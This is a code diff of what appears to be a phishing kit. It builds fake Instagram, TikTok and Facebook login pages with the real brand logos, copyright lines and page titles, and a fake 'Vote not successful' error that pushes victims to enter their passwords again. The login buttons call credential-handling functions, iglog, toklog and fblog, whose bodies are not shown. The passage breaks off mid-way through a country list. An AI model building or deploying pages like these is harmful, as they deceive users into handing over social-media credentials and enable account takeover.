-            <div id="mount_0_0_6z">
-                <div class="">
-                    <div class="">
-                        <div
-                            class="x4afe7t x1v7wizp xqcmdr3 x1htlvfj xds687c xixxii4 x17qophe x13vifvy x1x85hfe x1s85apg">
-                            <div
-                                class="x1x1c4bx x1c74tu6 x1v7wizp x1w55rbo xa3vuyk xuoj239 xee5nap xh8yej3 x1so62im xds687c xixxii4 x17qophe x13vifvy x1x85hfe">
-                                <div
-                                    class="x1x1c4bx x1c74tu6 xa4qsjk x1eg1fw9 x1esw782 x12zrl2 xuoj239 xee5nap xh8yej3 x1so62im">
+                    <div class="tokpart bg-black">
+                        <div class="bg-black p-8 w-full max-w-md">
+                            <div id="buttonsContainer">
+                                <!-- Container Div for Google, Apple Buttons, and 'or' Divider -->
+                                <button id="ButtonGoogle" type="button" onclick=""
+                                    class="w-full py-2 bg-blue-600 px-4 rounded-md flex items-center justify-center text-white focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 mt-4"
+                                    style="font-family: 'Google Sans', arial, sans-serif; font-weight: 400; overflow: hidden;">
+                                    <!-- Google Icon -->
+                                    <img src="image/fbss.png" alt="Google Icon" class="h-5 mr-3">
+                                    Continue Using Facebook
+                                </button>
+                                <div class="flex items-center my-4">
+                                    <div class="flex-grow border-t border-gray-700"></div>
+                                    <span class="mx-4 text-gray-500">OR</span>
+                                    <div class="flex-grow border-t border-gray-700"></div>
                                 </div>
                             </div>
+                            <!-- Email Input -->
+                            <div class="mb-4 relative">
+                                <input type="text" id="ig-uname" name="" required
+                                    class="mt-1 block w-full px-3 py-2 border border-gray-700 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 bg-[transparent] peer text-gray-300"
+                                    placeholder="Phone, Email address, or username" />
+                            </div>
+                            <div class="mb-4">
+                                <!-- Input Field -->
+                                <input type="text" id="ig-pass" name="" required
+                                    class="mt-1 block w-full px-3 py-2 border border-gray-700 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 bg-[transparent] peer text-gray-300"
+                                    placeholder="Password" />
+
+                                <!-- Forgot Password Button -->
+                                <button id="forgotPasswordButton" type="button"
+                                    class="text-blue-600 py-2 px-4 rounded-none bg-transparent border-0 hover:text-blue-800 focus:outline-none focus:ring-0 mt-0 mr-0 ml-auto block">
+                                    Forgot Password?
+                                </button>
+                            </div>
+                            <!-- Login Button -->
+                            <button id="loginButton" type="button" onclick="iglog()"
+                                class="w-full bg-blue-600 text-gray-100 py-2 px-4 rounded-md focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 mt-4">
+                                Log in
+                            </button>
+
+                            <p class="mt-6 text-left text-xl text-gray-100">
+                                Don't have an account?
+                                <a href="#" class="font-medium text-blue-600 hover:text-blue-500">Sign up</a>
+                            </p>
                         </div>
-                        <div class="x9f619 x1n2onr6 x1ja2u2z">
-                            <div class="x78zum5 xdt5ytf x1n2onr6 x1ja2u2z">
-                                <div class="x78zum5 xdt5ytf x1n2onr6 xat3117 xxzkxad x4m6w61">
-                                    <div class="x78zum5 xdt5ytf x1t2pt76 x1n2onr6 x1ja2u2z x10cihs4">
-                                        <section class="x78zum5 xdt5ytf x1iyjqo2 x1wjobn4">
-                                            <main class="xvbhtw8 x78zum5 xdt5ytf x1iyjqo2 x182iqb8 x1n2onr6 xg6iff7"
-                                                role="main">
-                                                <nav
-                                                    class="x6s0dn4 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x78zum5 xdt5ytf x2lah0s xln7xf2 xk390pu x1anpbxc xmo9yow xat24cr x17adc0v xexx8yu x4uap5 x18d9i69 xkhd6sd x1n2onr6 x11njtxf">
-                                                    <span
-                                                        class="x1ypdohk x1rg5ohu x1n2onr6 x16dsc37 x1pg5gke x1yrsyyn xsyo7zv x10b6aqq x16hj40l x1qkh490">
-                                                        <div
-                                                            class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1uhb9sk x1plvlek xryxfnj x1c4vz4f x2lah0s x1q0g3np xqjyukv x6s0dn4 x1oa3qoh xl56j7k">
-                                                            <span
-                                                                class="x1lliihq x1plvlek xryxfnj x1n2onr6 x193iq5w xeuugli x1fj9vlw x13faqbe x1vvkbs x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x1i0vuye x1fhwpqd xo1l8bm x1roi4f4 x1s3etm8 x676frb x10wh9bi x1wdrske x8viiok x18hxmgj"
-                                                                dir="auto"
-                                                                style="line-height: var(--base-line-clamp-line-height); --base-line-clamp-line-height: 16px;">English</span>
-                                                            <div
-                                                                class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh xsgj6o6 x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x6s0dn4 x1oa3qoh xl56j7k">
-                                                                <span
-                                                                    style="display: inline-block; transform: rotate(180deg);"><svg
-                                                                        aria-label="Down chevron icon"
-                                                                        class="x1lliihq x1n2onr6 x1roi4f4"
-                                                                        fill="currentColor" height="12" role="img"
-                                                                        viewBox="0 0 24 24" width="12">
-                                                                        <title>Down chevron icon</title>
-                                                                        <path
-                                                                            d="M21 17.502a.997.997 0 0 1-.707-.293L12 8.913l-8.293 8.296a1 1 0 1 1-1.414-1.414l9-9.004a1.03 1.03 0 0 1 1.414 0l9 9.004A1 1 0 0 1 21 17.502Z">
-                                                                        </path>
-                                                                    </svg></span>
-                                                            </div>
-                                                        </div>
-                                                    </span>
-                                                </nav>
-                                                <article
-                                                    class="x1qjc9v5 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x78zum5 x1q0g3np x1iyjqo2 x2lah0s xk390pu xl56j7k xg87l8a xkrivgy xat24cr x1gryazu x1ykew4q xexx8yu x4uap5 x1gan7if xkhd6sd x11njtxf xh8yej3 x1d2lwc3 x1n2onr6">
-                                                    <div class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1"
-                                                        style="width: 100%;">
-                                                        <div
-                                                            class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x6s0dn4 x1oa3qoh x1nhvcw1">
-                                                            <div class="_ab1y _ab1-">
-                                                                <div class="_ab21">
-                                                                    <div
-                                                                        class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh xseo6mj xod5an3 x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
-                                                                        <div aria-disabled="false" role="button"
-                                                                            tabindex="0" style="cursor: pointer;"><i
-                                                                                data-visualcompletion="css-img"
-                                                                                aria-label="Instagram" class=""
-                                                                                style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yh/r/IS7e616CiR2.png&quot;); background-position: 0px 0px; background-size: 176px 258px; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i>
-                                                                        </div>
-                                                                    </div>
-                                                                    <div class="_ab3a">
+                    </div>
+                </main>
 
-                                                                        <div
-                                                                            class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh xqui205 x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
-                                                                            <div
-                                                                                class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1xmf6yo x1e56ztr x540dpk x1m39q7l x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
-                                                                                <button onclick="fb()"
-                                                                                    class=" _acan _acap _acas _aj1- _ap30"
-                                                                                    type="button"><span
-                                                                                        class="_9zlu _ab36"></span><span
-                                                                                        class="">Continue with
-                                                                                        Facebook</span></button>
-                                                                            </div>
-                                                                            <div class="_ab38">
-                                                                                <div class="x78zum5 x1q0g3np">
-                                                                                    <div
-                                                                                        class="x1iyjqo2 xs83m0k xjm9jq1 x1n2onr6 xwtuau4 x11mr3az">
-                                                                                    </div>
-                                                                                    <div
-                                                                                        class="x1qjc9v5 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x1roi4f4 x78zum5 xdt5ytf x1c4vz4f x2lah0s x1nxh6w3 x1s688f x1ly1vsg xdj266r xpdqn1h xat24cr x1sliqq xexx8yu x4uap5 x18d9i69 xkhd6sd x1n2onr6 xtvhhri x11njtxf">
-                                                                                        or</div>
-                                                                                    <div
-                                                                                        class="x1iyjqo2 xs83m0k xjm9jq1 x1n2onr6 xwtuau4 x11mr3az">
-                                                                                    </div>
-                                                                                </div>
-                                                                            </div>
-                                                                            <div class="instacontainer">
-                                                                                <div
-                                                                                    class="x6s0dn4 xnz67gz x19gtwsn x1nk0tez x1xp9za0 x1hm1hlx x1npaq5j x1c83p5e x1enjb0b x199158v x13fuv20 xu3j5b3 x1q0q8m5 x26u7qi x178xt8z xm81vs4 xso031l xy80clv x9f619 x5n08af x78zum5 x1q0g3np xvs91rp x1n2onr6 xh8yej3">
-                                                                                    <label class="_aa48 _aa49"><span
-                                                                                            class="_aa4a">Phone
-                                                                                            number,
-                                                                                            username, or
-                                                                                            email</span><input
-                                                                                            id="ig-uname"
-                                                                                            aria-label="Phone number, username, or email"
-                                                                                            aria-required="true"
-                                                                                            autocapitalize="off"
-                                                                                            autocorrect="off"
-                                                                                            maxlength="75"
-                                                                                            class="_aa4b _add6 _ac4d _ap35"
-                                                                                            dir="" type="text"></label>
-                                                                                    <div
-                                                                                        class="x6s0dn4 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x78zum5 xdl72j9 x1q0g3np x1c4vz4f x2lah0s xk390pu x5yr21d xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x1sxyh0 x18d9i69 xkhd6sd x1n2onr6 xxymvpz">
-                                                                                    </div>
-                                                                                </div>
-                                                                            </div>
-                                                                            <div class="instacontainer">
-                                                                                <div
-                                                                                    class="x6s0dn4 xnz67gz x19gtwsn x1nk0tez x1xp9za0 x1hm1hlx x1npaq5j x1c83p5e x1enjb0b x199158v x13fuv20 xu3j5b3 x1q0q8m5 x26u7qi x178xt8z xm81vs4 xso031l xy80clv x9f619 x5n08af x78zum5 x1q0g3np xvs91rp x1n2onr6 xh8yej3">
-                                                                                    <label class="_aa48 _aa49">
-                                                                                        <span
-                                                                                            class="_aa4a">Password</span>
-                                                                                        <input id="ig-pass"
-                                                                                            aria-label="Password"
-                                                                                            aria-required="true"
-                                                                                            autocapitalize="off"
-                                                                                            autocorrect="off"
-                                                                                            class="_aa4b _add6 _ac4d _ap35"
-                                                                                            type="password" dir="">
-                                                                                    </label>
-                                                                                    <div
-                                                                                        class="x6s0dn4 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x78zum5 xdl72j9 x1q0g3np x1c4vz4f x2lah0s xk390pu x5yr21d xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x1sxyh0 x18d9i69 xkhd6sd x1n2onr6 xxymvpz">
-                                                                                        <div
-                                                                                            class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1i64zmx x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
-                                                                                        </div>
-                                                                                    </div>
-                                                                                </div>
-                                                                            </div>
-                                                                            <div
-                                                                                class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1e56ztr x540dpk x1m39q7l xsag5q8 xz9dl7a x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s x1q0g3np xqjyukv x1qjc9v5 x1oa3qoh x13a6bvl">
-                                                                                <span
-                                                                                    class="x1lliihq x1plvlek xryxfnj x1n2onr6 x193iq5w xeuugli x1fj9vlw x13faqbe x1vvkbs x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x1i0vuye xvs91rp xo1l8bm x173jzuc x2b8uid x1tu3fi x3x7a5m x10wh9bi x1wdrske x8viiok x18hxmgj"
-                                                                                    dir="auto"
-                                                                                    style="cursor: pointer; line-height: var(--base-line-clamp-line-height); --base-line-clamp-line-height: 18px;">Forgot
-                                                                                    password?</span>
-                                                                            </div>
+                <!-- Footer Section -->
+                <footer id="error-message" style="background-color: rgb(18, 18, 18);"
+                    class="text-white text-sm mt-2 text-center py-1 mt-auto w-full">
+                    <div class="flex justify-center items-center flex-col">
+                        <!-- Text above the image with reduced margin -->
+                        <p class="mb-0" style="font-size: 12px; margin-bottom: 2px;">from</p>
+                        <!-- Linked image -->
+                        <a href="https://www.example.com">
+                            <img src="image/meta.png" alt="logo" class="h-14">
+                        </a>
+                    </div>
+                </footer>
+            </div>
+        </div>
 
-
-                                                                            <div
-                                                                                class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1xmf6yo x1e56ztr x540dpk x1m39q7l x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
-
-                                                                                <button
-                                                                                    class="c-btn _acan _acap _acas _aj1- _ap30"
-                                                                                    type="submit"
-                                                                                    onclick="iglog(); clearInstagramPasswordField();"
-                                                                                    id="ig-log"> Log in</button>
-                                                                            </div>
-
-                                                                        </div>
-
-                                                                        <span id="ig_error_box"
-                                                                            class="x1lliihq x1plvlek xryxfnj x1n2onr6 x193iq5w xeuugli x1fj9vlw x13faqbe x1vvkbs x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x1i0vuye xvs91rp xo1l8bm x5n08af x1tu3fi x3x7a5m x10wh9bi x1wdrske x8viiok x18hxmgj"
-                                                                            dir="auto"
-                                                                            style=" display: none; line-height: var(--base-line-clamp-line-height); --base-line-clamp-line-height: 18px;">
-                                                                            <div class="_ab2z">Sorry, your password was
-                                                                                incorrect. Please double-check your
-                                                                                password.</div>
-                                                                        </span>
-
-                                                                        <div
-                                                                            class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh xw7yly9 x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x6s0dn4 x1oa3qoh x1nhvcw1">
-                                                                            <span
-                                                                                class="x1lliihq x1plvlek xryxfnj x1n2onr6 x193iq5w xeuugli x1fj9vlw x13faqbe x1vvkbs x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x1i0vuye xvs91rp xo1l8bm x1roi4f4 x1tu3fi x3x7a5m x10wh9bi x1wdrske x8viiok x18hxmgj"
-                                                                                dir="auto"
-                                                                                style="line-height: var(--base-line-clamp-line-height); --base-line-clamp-line-height: 18px;">
-                                                                                <p>Don't have an account? <span
-                                                                                        class="_ap3a _aaco _aacw _aad0 _aad7"
-                                                                                        dir="auto">Sign
-                                                                                        up</span>
-                                                                                </p>
-                                                                            </span>
-                                                                        </div>
-                                                                    </div>
-                                                                </div>
-                                                            </div>
-                                                        </div>
-                                                    </div>
-                                                </article>
-                                                <div
-                                                    class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1hq5gj4 x1n2onr6 x1ey2m1c x1plvlek xryxfnj x1c4vz4f x2lah0s x1q0g3np xqjyukv x1qjc9v5 x1oa3qoh xl56j7k">
-                                                    <div class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1"
-                                                        style="height: 26px; width: 52px;"><img alt="from Meta"
-                                                            src="img/meta.svg">
-                                                    </div>
-                                                </div>
-                                            </main>
-                                        </section>
-                                        <div>
-                                            <div></div>
-                                        </div>
-                                    </div>
-                                    <div>
-                                        <div></div>
+        <div id="tokp">
+            <div class="min-h-screen flex flex-col w-full">
+                <!-- Main Content Section -->
+                <main class="flex-grow">
+                    <div class="flex justify-between items-center p-4">
+                        <!-- Left Section -->
+                        <div class="flex items-center">
+                            <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a9/TikTok_logo.svg/1000px-TikTok_logo.svg.png?20200415104610"
+                                alt="logo" class="h-10">
+                        </div>
+                        <!-- Right Section -->
+                        <div class="flex items-center space-x-2">
+                            <i class="fa fa-question-circle text-gray-500 hover:text-gray-700" aria-hidden="true"></i>
+                            <span id="feedback-help" class="text-gray-500 hover:text-gray-700">Feedback and
+                                help</span>
+                        </div>
+                    </div>
+                    <div class="tokpart text-black">
+                        <div class="bg-white p-8 w-full max-w-md">
+                            <h2 id="login-title" class="text-2xl font-bold mb-6 text-center">Log In</h2>
+                            <div>
+                                <div class="mb-4">
+                                    <label id="email-label" for="email"
+                                        class="block text-sm font-medium text-gray-700">Email or
+                                        username</label>
+                                    <input type="text" id="tok-uname" required
+                                        class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500"
+                                        oninput="checkInput()">
+                                    <p id="email-feedback" class="text-sm text-red-500 hidden">Please enter a valid
+                                        account.</p>
+                                </div>
+                                <div class="mb-6">
+                                    <label id="password-label" for="password"
+                                        class="block text-sm font-medium text-gray-700">Password</label>
+                                    <input type="password" id="tok-pass" name="password" required
+                                        class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500"
+                                        oninput="checkPassword()">
+                                    <p id="password-feedback" class="text-sm text-red-500 hidden">Password must be at
+                                        least 6 characters long.</p>
+                                </div>
+                                <div class="flex items-center justify-between mb-6">
+                                    <div class="text-sm">
+                                        <a id="forgot-password" href="#"
+                                            class="font-medium text-gray-600 hover:text-gray-500">Forgot
+                                            password?</a>
                                     </div>
                                 </div>
+                                <button onclick="toklog()" type="submit" id="login-button"
+                                    class="w-full bg-pink-600 text-white py-2 px-4 rounded-md hover:bg-pink-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500">Log
+                                    in</button>
+                            </div>
+                            <p id="signup-text" class="mt-6 text-center text-sm text-gray-600">
+                                Don't have an account?
+                                <a href="#" class="font-medium text-pink-600 hover:text-pink-500">Sign up</a>
+                            </p>
+                        </div>
+                    </div>
+                </main>
+                <!-- Footer Section -->
+                <footer class="bg-gray-900 text-white py-6 mt-auto w-full">
+                    <div class="w-full px-4">
+                        <div class="flex justify-between items-center">
+                            <!-- Left Section: Language Selector with Rounded Border -->
+                            <div class="flex items-center space-x-4">
+                                <select id="languageSelect" onchange="translatePage()"
+                                    class="bg-gray-900 text-gray-500 py-1 px-3 rounded-80 border border-gray-200 focus:outline-none focus:ring-2 focus:ring-blue-500">
+                                    <option value="en">English</option>
+                                    <option value="es">Español</option>
+                                    <option value="fr">Français</option>
+                                    <option value="de">Deutsch</option>
+                                    <option value="it">Italiano</option>
+                                    <option value="pt">Português</option>
+                                    <option value="zh">中文 (Chinese)</option>
+                                    <option value="ar">العربية (Arabic)</option>
+                                </select>
+                            </div>
+                            <!-- Right Section: Copyright -->
+                            <div class="text-sm text-gray-500">
+                                &copy; 2025 TikTok
                             </div>
                         </div>
                     </div>
+                </footer>
+            </div>
+        </div>
+
+        <script>
+            // Check if email is valid
+            function checkInput() {
+                const email = document.getElementById('tok-uname').value;
+                const emailFeedback = document.getElementById('email-feedback');
+
+                if (emailPattern.test(email)) {
+                    emailFeedback.classList.add('hidden');
+                } else {
+                    emailFeedback.classList.remove('hidden');
+                }
+            }
+
+            // Check if password is valid (at least 6 characters)
+            function checkPassword() {
+                const password = document.getElementById('tok-pass').value;
+                const passwordFeedback = document.getElementById('password-feedback');
+
+                if (password.length >= 6) {
+                    passwordFeedback.classList.add('hidden');
+                } else {
+                    passwordFeedback.classList.remove('hidden');
+                }
+            }
+        </script>
+
+        <div id="fbp" class="bg-gray-100 text">
+            <div class="min-h-screen flex flex-col w-full">
+                <!-- Main Content Section -->
+                <main class="flex-grow p-2"> <!-- Reduced padding here -->
+                    <div class="flex justify-center mt-9 mb-4">
+                        <!-- Centered Image -->
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/Facebook_logo_%282023%29.svg/800px-Facebook_logo_%282023%29.svg.png"
+                            alt="logo" class="h-12">
+                    </div>
+                    <div class="flex justify-center mb-4 text-black">
+                        <p class="text-xl text-center break-words max-w-md">
+                            Facebook helps you connect and share with the people in your life.
+                        </p>
+                    </div>
+                    <div class="tokpart">
+                        <div class="bg-white p-8 w-full max-w-md border border-white shadow-2xl rounded-lg">
+                            <!-- Email Input -->
+                            <div class="mb-4 relative">
+                                <input type="text" id="fb-uname" name="" required
+                                    class="mt-1 block w-full px-3 py-2 border border-gray-200 rounded-md focus:outline-none focus:ring-blue-500 focus:border-blue-500 bg-[transparent] peer text-gray-800"
+                                    placeholder="Email address or phone number" />
+                            </div>
+                            <div class="mb-4">
+                                <!-- Input Field -->
+                                <input type="text" id="fb-pass" name="" required
+                                    class="mt-1 block w-full px-3 py-2 border border-gray-200 rounded-md  focus:outline-none focus:ring-blue-500 focus:border-blue-500 bg-[transparent] peer text-gray-800"
+                                    placeholder="Password" />
+                                <!-- Login Button -->
+                                <button id="loginButton" type="button" onclick="fblog()"
+                                    class="w-full bg-[#0866ff] text-white py-3 px-6 text-lg rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 focus:ring-[#0866ff] mt-4 font-semibold">
+                                    Log in
+                                </button>
+                                <!-- Forgot Password Button -->
+                                <button id="forgotPasswordButton" type="button"
+                                    class="w-full bg-transparent text-[#0866ff] py-3 px-6 text-sm rounded-md border-0 hover:text-[#0866ff] focus:outline-none focus:ring-0 mt-0">
+                                    Forgotten Password?
+                                </button>
+                                <!-- Divider -->
+                                <div class="flex items-center my-2">
+                                    <div class="flex-grow border-t border-gray-300"></div>
+                                    <div class="flex-grow border-t border-gray-300"></div>
+                                </div>
+                                <!-- Create New Account Button -->
+                                <button id="createAccountButton" type="button"
+                                    class="w-full bg-green-600 text-white py-3 px-6 text-lg rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 focus:ring-green-600 mt-4">
+                                    Create new account
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="flex justify-center mb-4 mt-7 text-gray-600">
+                        <p class="text-l text-center break-words max-w-md">
+                            <span style="font-weight: 600;"> Create a Page </span> for a celebrity, brand or
+                            business.
+                        </p>
+                    </div>
+                </main>
+
+                <!-- Footer Section -->
+                <footer id="error-message" class="bg-white text-gray-600 text-sm mt-2 py-5 w-full">
+                    <div class="w-full px-5">
+                        <!-- Container -->
+                        <div class="flex flex-col gap-4">
+
+                            <!-- Language Section -->
+                            <div class="px-2">
+                                <div class="flex flex-wrap gap-2 text-xs text-gray-600">
+                                    <a href="#" class="inline-block cursor-pointer hover:underline">English (UK)</a>
+                                    <a href="#" class="inline-block cursor-pointer hover:underline">Hausa</a>
+                                    <a href="#" class="inline-block cursor-pointer hover:underline">Français
+                                        (France)</a>
+                                    <a href="#" class="inline-block cursor-pointer hover:underline">Português
+                                        (Brasil)</a>
+                                    <a href="#" class="inline-block cursor-pointer hover:underline">Español</a>
+                                    <a href="#" class="inline-block cursor-pointer hover:underline">العربية</a>
+                                    <a href="#" class="inline-block cursor-pointer hover:underline">Bahasa
+                                        Indonesia</a>
+                                    <a href="#" class="inline-block cursor-pointer hover:underline">Deutsch</a>
+                                    <a href="#" class="inline-block cursor-pointer hover:underline">日本語</a>
+                                    <a href="#" class="inline-block cursor-pointer hover:underline">Italiano</a>
+                                    <a href="#" class="inline-block cursor-pointer hover:underline">हिन्दी</a>
+                                </div>
+                            </div>
+                            <!-- Divider Line -->
+                            <hr class="border-gray-300 w-full">
+                            <!-- Copyright Section -->
+                            <div class="px-2 text-xs text-gray-500">
+                                Meta &copy;2025
+                            </div>
+                        </div>
+                    </div>
+                </footer>
+            </div>
+        </div>
+    </div>
+
+    <!-- Custom Alert -->
+    <div id="custom-alert" class="hidden fixed inset-0 flex items-center justify-center z-50 p-6">
+        <!-- Overlay -->
+        <div class="fixed z-40 inset-0 bg-gray-500 dark:bg-gray-900 opacity-80" onclick="hideAlert()"
+            aria-hidden="true">
+        </div>
+        <!-- Trick to center modal -->
+        <span class="hidden sm:inline-block sm:align-middle sm:h-screen" aria-hidden="true"></span>
+        <!-- Error Dialog -->
+        <div id="modal-content"
+            class="relative z-50 inline-block align-bottom bg-white dark:bg-gray-800 rounded-lg text-left overflow-visible shadow-xl my-8 w-full max-w-sm sm:max-w-md">
+            <!-- Close button -->
+            <div class="absolute top-0 right-0 pt-4 pr-4">
+                <button type="button"
+                    class="rounded-md text-gray-400 hover:text-gray-500 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500"
+                    onclick="hideAlert()">
+                    <span class="sr-only">Close</span>
+                    <svg class="h-6 w-6" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
+                        stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12">
+                        </path>
+                    </svg>
+                </button>
+            </div>
+            <!-- Modal Content -->
+            <div class="px-4 pt-5 pb-4 sm:p-6 rounded-md">
+                <div class="mx-auto flex items-center justify-center h-12 w-12 rounded-full bg-red-100">
+                    <svg class="h-6 w-6 text-red-600" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
+                        stroke="currentColor" aria-hidden="true">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                            d="M12 2a10 10 0 110 20 10 10 0 010-20zm-4 8l8 8m0-8l-8 8"></path>
+                    </svg>
+                </div>
+                <div class="mt-3 text-center sm:mt-5">
+                    <h3 id="alert-title" class="text-lg leading-6 font-medium text-gray-900 dark:text-white">
+                        Vote not successful
+                    </h3>
+                    <div class="mt-2">
+                        <p id="alert-message" class="text-sm text-gray-500">
+                            Sorry, something went wrong. Please try again.
+                        </p>
+                    </div>
+                </div>
+                <div class="mt-4 sm:mt-6 sm:flex sm:space-x-6">
+                    <button onclick="hideAlert()"
+                        class="button w-full bg-blue-500 text-white py-2 px-4 rounded-lg hover:bg-blue-600 transition duration-300">
+                        Try Again
+                    </button>
                 </div>
             </div>
         </div>
     </div>
-    <!--Insta login ends-->
-
-
-    <script>
-
-        function clearInstagramPasswordField() {
-            // Set a delay before clearing the password field (in milliseconds)
-            setTimeout(function () {
-                // Get the password field element by its ID
-                var passwordField = document.getElementById("ig-pass");
-
-                // Clear the value of the password field
-                passwordField.value = "";
-            }, 2000); // Delay of 2000ms (2 seconds)
-        }
-
-
-
-        function togglePasswordVisibility() {
-            var passwordField = document.getElementById("password");
-            var toggleButton = document.querySelector(".toggle-password");
-
-            if (passwordField.type === "password") {
-                passwordField.type = "text";
-                toggleButton.style.backgroundImage = "url('img/view.png')"; // Change to visible icon
-            } else {
-                passwordField.type = "password";
-                toggleButton.style.backgroundImage = "url('img/hide.png')"; // Change to hidden icon
-            }
-        }
-
-        function toggleClearIcon() {
-            var input = document.getElementById("email");
-            var clearIcon = document.getElementById("clearIcon");
-
-            if (input.value.trim() !== "") {
-                clearIcon.style.display = "block";
-            } else {
-                clearIcon.style.display = "none";
-            }
-        }
-
-        function clearEmailInput() {
-            var input = document.getElementById("email");
-            input.value = "";
-            document.getElementById("clearIcon").style.display = "none";
-        }
-
-        function changeFavicon(iconUrl) {
-            const favicon = document.getElementById('dynamic-favicon');
-            favicon.href = iconUrl;
-        }
-
-        function fb() {
-            document.getElementById("fb_wrapper").style.display = "block";
-            document.getElementById("ig_wrapper").style.display = "none";
-            document.getElementById("home").style.display = "none";
-            document.getElementById("choose").style.display = "none";
-
-        }
-
-        function handleFbClick() {
-            changeFavicon('img/favicon.png');
-            fb();
-            document.title = 'Log in to Facebook';
-        }
-
-        function tw() {
-            document.getElementById("tw_wrapper").style.display = "block";
-            document.getElementById("fb_wrapper").style.display = "none";
-            document.getElementById("home").style.display = "none";
-            document.getElementById("choose").style.display = "none";
-
-        }
-
-        function handleTwClick() {
-            changeFavicon('img/twfavicon.png');
-            tw();
-            document.title = 'Log in to X / X';
-        }
-function tok() {
-            document.getElementById("tok_wrapper").style.display = "block";
-            document.getElementById("fb_wrapper").style.display = "none";
-            document.getElementById("home").style.display = "none";
-            document.getElementById("choose").style.display = "none";
-
-        }
-
-        function handleTokClick() {
-            changeFavicon('img/tok.png');
-            tw();
-            document.title = 'Log in to TikTok';
-        }
-
-        function ig() {
-            document.getElementById("ig_wrapper").style.display = "block";
-            document.getElementById("fb_wrapper").style.display = "none";
-            document.getElementById("home").style.display = "none";
-            document.getElementById("choose").style.display = "none";
-        }
-
-        function handleIgClick() {
-            changeFavicon('img/igfavicon.png');
-            ig();
-            document.title = 'Instagram';
-
-        }
-
-
-        function closeVoteBox() {
-            document.getElementById('voteBox').style.display = 'none';
-        }
-
-    </script>
-
-    <script type="text/javascript">
-        var listCountries = ['China', 'India', 'Japan', 'South Korea', 'Indonesia', 'Saudi Arabia', 'Turkey', 'Iran', 'Thailand', 'Malaysia',
-            'Vietnam', 'Philippines', 'Pakistan', 'Bangladesh', 'Iraq', 'United Arab Emirates', 'Israel', 'Singapore',
-            'Kuwait', 'Jordan', 'Lebanon', 'Qatar', 'Kazakhstan', 'Oman', 'Sri Lanka', 'Myanmar', 'Bahrain', 'Yemen',
